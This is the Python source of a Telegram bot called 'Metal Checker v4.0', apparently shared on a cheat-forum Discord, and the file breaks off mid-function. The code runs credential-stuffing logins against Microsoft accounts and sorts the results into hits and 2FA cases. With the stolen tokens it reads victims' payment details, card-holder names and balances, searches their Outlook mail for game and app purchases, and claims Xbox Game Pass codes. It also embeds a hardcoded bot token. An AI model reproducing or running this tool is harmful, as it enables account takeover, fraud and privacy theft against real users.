# ==============================================================================
# METAL CHECKER v4.0 - THE ULTIMATE TELEGRAM BOT EDITION (INTEGRATED)
# Coded by: @vantrexXxx
# Supported by: Metal Drops & Icardi
# Discord: discord.gg/cheatglobal
# Features: Checker, Fetcher, Validator, Sorter (No HWID Limits)
# ==============================================================================

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
import requests
import json
import uuid
import re
import time
import os
import sys
import shutil
import random
import string
import queue
from datetime import datetime, timezone
from pathlib import Path
from threading import Lock, Thread, Event
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, deque
from urllib.parse import quote, unquote, urlparse, parse_qs

# -----------------------------------------
# GLOBAL SETTINGS, TOKENS & STATES
# -----------------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8812460550:AAFlrjKwwAdoGFb-DWtwt9CGF7eeQmJnKmM")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# Bellek Yönetimi
user_states = {}
user_configs = {}
active_tasks = {}
stop_flags = {}

# -----------------------------------------
# 1. CORE CHECKER ENGINE (DOKUNULMADI)
# -----------------------------------------
class UnifiedChecker:
    def __init__(self, keywords=None, api_mode=2, check_mode="both"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode
        self.check_mode = check_mode
        
    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except: pass
        return "Unknown"
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str: return "?"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except: return "?"
    
    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r.text + " " + r.url
            
            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token: return {"status": "FREE", "subscriptions": [], "data": {}}
            
            sub_data = {}
            subscriptions = []
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": str(uuid.uuid4()),
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                if r_pay.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                    if balance_match: sub_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
                    if card_match: sub_data['card_holder'] = card_match.group(1)
            except: pass
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r_sub.status_code == 200:
                    response_text = r_sub.text
                    subscription_keywords = {
                        'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                        'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                        'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
                        'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
                        'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                        'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
                        'Minecraft': {'type': 'MINECRAFT REALMS', 'category': 'gaming'}
                    }
                    
                    items = []
                    try:
                        js = r_sub.json()
                        if isinstance(js, list):
                            items = js
                        elif isinstance(js, dict):
                            if 'value' in js and isinstance(js['value'], list):
                                items = js['value']
                            elif 'items' in js and isinstance(js['items'], list):
                                items = js['items']
                            else:
                                items = [js]
                    except:
                        items = []
                        blocks = response_text.split('}')
                        for b in blocks:
                            if 'title' in b or any(k in b for k in subscription_keywords):
                                items.append(b + '}')
                    
                    for item in items:
                        item_str = json.dumps(item) if isinstance(item, (dict, list)) else str(item)
                        for keyword, info in subscription_keywords.items():
                            if keyword in item_str:
                                sub_info = {'name': info['type'], 'category': info['category']}
                                
                                if isinstance(item, dict) and 'title' in item and item['title']:
                                    sub_info['title'] = str(item['title'])
                                else:
                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', item_str)
                                    if title_match: sub_info['title'] = title_match.group(1)
                                    else: sub_info['title'] = keyword
                                    
                                renewal_date = None
                                if isinstance(item, dict):
                                    renewal_date = item.get('nextRenewalDate', item.get('renewalDate'))
                                    if renewal_date and 'T' in renewal_date:
                                        renewal_date = renewal_date.split('T')[0]
                                        
                                if not renewal_date:
                                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', item_str)
                                    if renewal_match:
                                        renewal_date = renewal_match.group(1)
                                        
                                if renewal_date:
                                    sub_info['renewal_date'] = renewal_date
                                    days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                    sub_info['days_remaining'] = days_remaining
                                    if days_remaining != "?" and int(days_remaining) <= 0:
                                        sub_info['is_expired'] = True
                                    else:
                                        sub_info['is_expired'] = False
                                subscriptions.append(sub_info)
                                break
                            
                    if subscriptions:
                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
                        return {"status": "PREMIUM" if active_subs else "FREE", "subscriptions": subscriptions, "data": sub_data}
            except: pass
            return {"status": "FREE", "subscriptions": [], "data": sub_data}
        except: return {"status": "ERROR", "subscriptions": [], "data": {}}
    
    def check_psn(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"}, "Size": 50, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}
                                if 'Preview' in result:
                                    full_text = result.get('ItemBody', {}).get('Content', result['Preview'])
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)', 
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)', 
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)'
                                    ]
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name).replace('\\r', '').replace('\\n', '')
                                            purchase_info['item'] = item_name
                                            break
                                if purchase_info.get('item'): purchases.append(purchase_info)
                if total_orders > 0: return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders, "purchases": purchases}
            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
        except: return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}

    def check_steam(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 30, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total = 0
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)
                        if 'Results' in result_set:
                            for result in result_set['Results'][:5]:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    game_match = re.search(r'Thank you for your.*?purchase.*?:\s*([^\.]+)', preview, re.IGNORECASE)
                                    if game_match: purchases.append({'game': game_match.group(1).strip()})
                if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total, "purchases": purchases}
            return {"steam_status": "FREE", "steam_count": 0, "purchases": []}
        except: return {"steam_status": "ERROR", "steam_count": 0, "purchases": []}

    def check_supercell(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 20, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                games = []
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    if 'Clash Royale' in preview and 'Clash Royale' not in games: games.append('Clash Royale')
                                    if 'Clash of Clans' in preview and 'Clash of Clans' not in games: games.append('Clash of Clans')
                                    if 'Brawl Stars' in preview and 'Brawl Stars' not in games: games.append('Brawl Stars')
                                    if 'Hay Day' in preview and 'Hay Day' not in games: games.append('Hay Day')
                        if games: return {"supercell_status": "LINKED", "games": games}
            return {"supercell_status": "FREE", "games": []}
        except: return {"supercell_status": "ERROR", "games": []}

    def check_tiktok(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "account.tiktok"}, "Size": 10, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    patterns = [r'Salut\s+([^,]+)', r'Hallo\s+([^,]+)', r'Xin chào\s+([^,]+)', r'Hi\s+([^,]+)', r'Hello\s+([^,]+)']
                                    for pattern in patterns:
                                        match = re.search(pattern, preview)
                                        if match: return {"tiktok_status": "LINKED", "username": match.group(1).strip()}
            return {"tiktok_status": "FREE", "username": None}
        except: return {"tiktok_status": "ERROR", "username": None}

    def check_minecraft(self, email, access_token, cid):
        try:
            headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': 'Outlook-Android/2.0'}
            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                return {"minecraft_status": "OWNED", "minecraft_username": data.get('name', 'Unknown'), "minecraft_uuid": data.get('id', '')}
            return {"minecraft_status": "FREE", "minecraft_username": None}
        except: return {"minecraft_status": "ERROR", "minecraft_username": None}

    def GIDD(self, username):
        url = "https://users.roblox.com/v1/usernames/users"
        payload = {"usernames": [username], "excludeBannedUsers": False}
        try:
            r = requests.post(url, json=payload, timeout=10)
            if r.status_code == 200 and r.json().get("data"):
                return r.json()["data"][0]["id"]
        except: pass
        return None

    def CSRFFF(self):
        url = "https://catalog.roblox.com/v1/catalog/items/details"
        try:
            r = requests.post(url, json={"items":[]}, timeout=10)
            return r.headers.get("x-csrf-token")
        except: return None

    def GSNN(self, asset_ids):
        if not asset_ids: return []
        token = self.CSRFFF()
        if not token: return []
        url = "https://catalog.roblox.com/v1/catalog/items/details"
        items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
        headers = {"x-csrf-token": token}
        try:
            r = requests.post(url, json={"items": items}, headers=headers, timeout=10)
            if r.status_code == 200:
                return [item.get("name", "Unknown Item") for item in r.json().get("data", [])]
        except: pass
        return []

    def ERUU(self, search_text):
        patterns = [
            r'account:\s*([a-zA-Z0-9_]+)',
            r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
            r'account:\s*([a-zA-Z0-9_]+)\.',
            r'for\s+([a-zA-Z0-9_]+)\.\s+If'
        ]
        for pattern in patterns:
            match = re.search(pattern, search_text, re.IGNORECASE)
            if match: return match.group(1)
        return None

    def RLLL(self, username):
        result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": "", "wearing": []}
        user_id = self.GIDD(username)
        if not user_id: return None
        try:
            user_url = f"https://users.roblox.com/v1/users/{user_id}"
            user_res = requests.get(user_url, timeout=10)
            user_data = user_res.json()
            result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
            created_raw = user_data.get("created", "")
            result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
            
            friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
            friends_res = requests.get(friends_url, timeout=10)
            if friends_res.status_code == 200: result["friends"] = friends_res.json().get("count", 0)
            
            result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
            
            wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
            wearing_res = requests.get(wearing_url, timeout=10)
            if wearing_res.status_code == 200:
                asset_ids = wearing_res.json().get("assetIds", [])
                result["wearing"] = self.GSNN(asset_ids)
        except: return None
        return result

    def check_roblox(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                data = r.json()
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
                            full_text = ""
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    full_text += result.get('ItemBody', {}).get('Content', result['Preview']) + " "
                            
                            roblox_user = self.ERUU(full_text)
                            if roblox_user:
                                roblox_data = self.RLLL(roblox_user)
                                if roblox_data:
                                    return {"roblox_status": "LINKED", "data": roblox_data}
                                else:
                                    return {"roblox_status": "LINKED", "data": {"username": roblox_user, "friends": 0, "banned": "Unknown", "created": "Unknown", "profile": "", "wearing": []}}
            return {"roblox_status": "FREE", "data": {}}
        except: return {"roblox_status": "ERROR", "data": {}}

    def check(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid, 
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)", "Host": "odc.officeapps.live.com", 
                "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text or "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", "Origin": "https://login.live.com", "Referer": r2.url}
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            response_text = r3.text.lower()
            
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0: return {"status": "BAD"}
            if "identity/confirm" in response_text or "consent" in response_text: return {"status": "2FA", "email": email, "password": password}
            if "abuse" in response_text: return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return {"status": "BAD"}
            
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid: return {"status": "BAD"}
            cid = mspcid.upper()
            
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            
            if "access_token" not in r4.text: return {"status": "BAD"}
            access_token = r4.json()["access_token"]
            
            result = {"status": "HIT", "email": email, "password": password}
            
            if self.check_mode in ["microsoft", "both"]:
                ms_res = self.check_microsoft_subscriptions(email, password, access_token, cid)
                result.update({"ms_status": ms_res.get("status", "FREE"), "subscriptions": ms_res.get("subscriptions", [])})
            if self.check_mode in ["psn", "both"]:
                psn_res = self.check_psn(email, access_token, cid)
                result.update({"psn_orders": psn_res.get("psn_orders", 0), "psn_purchases": psn_res.get("purchases", [])})
            if self.check_mode in ["steam", "both"]:
                steam_res = self.check_steam(email, access_token, cid)
                result.update({"steam_count": steam_res.get("steam_count", 0), "steam_purchases": steam_res.get("purchases", [])})
            if self.check_mode in ["supercell", "both"]:
                sc_res = self.check_supercell(email, access_token, cid)
                result.update({"supercell_games": sc_res.get("games", [])})
            if self.check_mode in ["tiktok", "both"]:
                tk_res = self.check_tiktok(email, access_token, cid)
                result.update({"tiktok_username": tk_res.get("username")})
            if self.check_mode in ["minecraft", "both"]:
                mc_res = self.check_minecraft(email, access_token, cid)
                result.update({"minecraft_username": mc_res.get("minecraft_username")})
            if self.check_mode in ["roblox", "both"]:
                rbx_res = self.check_roblox(email, access_token, cid)
                result.update({"roblox_status": rbx_res.get("roblox_status", "FREE"), "roblox_data": rbx_res.get("data", {})})
                
            return result
        except requests.exceptions.Timeout: return {"status": "TIMEOUT"}
        except Exception: return {"status": "ERROR"}

# -----------------------------------------
# 2. XBOX CODE FETCHER & VALIDATOR ENGINE
# -----------------------------------------
class XboxCodeTools:
    def __init__(self):
        self.MICROSOFT_OAUTH_URL = (
            'https://login.live.com/oauth20_authorize.srf'
            '?client_id=00000000402B5328'
            '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
            '&scope=service::user.auth.xboxlive.com::MBI_SSL'
            '&display=touch&response_type=token&locale=en'
        )

    # --- FETCH LOGIC ---
    def fetch_oauth_tokens(self, session):
        try:
            response = session.get(self.MICROSOFT_OAUTH_URL, timeout=10)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if not match: return (None, None)
            ppft = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if not match: return (None, None)
            return (match.group(1), ppft)
        except: return (None, None)

    def fetch_login(self, session, email, password, url_post, ppft):
        try:
            resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                               headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
            if '#' in resp.url:
                token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                if token != 'None': return token
            if 'cancel?mkt=' in resp.text:
                ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
                pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
                uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
                action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
                if ipt and pprid and uaid and action:
                    ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=10)
                    return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
                    if return_url:
                        fin = session.get(return_url.group(), allow_redirects=True, timeout=10)
                        if '#' in fin.url:
                            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                            if token != 'None': return token
            return None
        except: return None

    def get_xbox_tokens(self, session, rps_token):
        try:
            resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
                json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                      'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
                headers={'Content-Type': 'application/json'}, timeout=15)
            if resp.status_code != 200: return (None, None)
            user_token = resp.json().get('Token')
            
            resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                      'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
                headers={'Content-Type': 'application/json'}, timeout=15)
            if resp.status_code != 200: return (None, None)
            data = resp.json()
            return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
        except: return (None, None)

    def fetch_codes_from_xbox(self, session, uhs, xsts_token):
        try:
            auth = f'XBL3.0 x={uhs};{xsts_token}'
            resp = session.get('https://profile.gamepass.com/v2/offers',
                headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
            if resp.status_code != 200: return []
            
            codes = []
            for offer in resp.json().get('offers', []):
                resource = offer.get('resource')
                if resource: codes.append(resource)
                elif offer.get('offerStatus') == 'available':
                    cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                    claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                        headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                        data='', timeout=15)
                    if claim_resp.status_code == 200:
                        code = claim_resp.json().get('resource')
                        if code: codes.append(code)
            return codes
        except: return []

    # --- VALIDATE LOGIC ---
    def generate_reference_id(self):
        timestamp_val = int(time.time() // 30)
        n = f'{timestamp_val:08X}'
        o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
        result_chars = []
        for e in range(64):
            if e % 8 == 1: result_chars.append(n[(e - 1) // 8])
            else: result_chars.append(o[e])
        return "".join(result_chars)

    def login_microsoft_account(self, email, password):
        session = requests.Session()
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://account.microsoft.com/',
            'Origin': 'https://account.microsoft.com',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }
        try:    
            login_response = session.post(
                f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
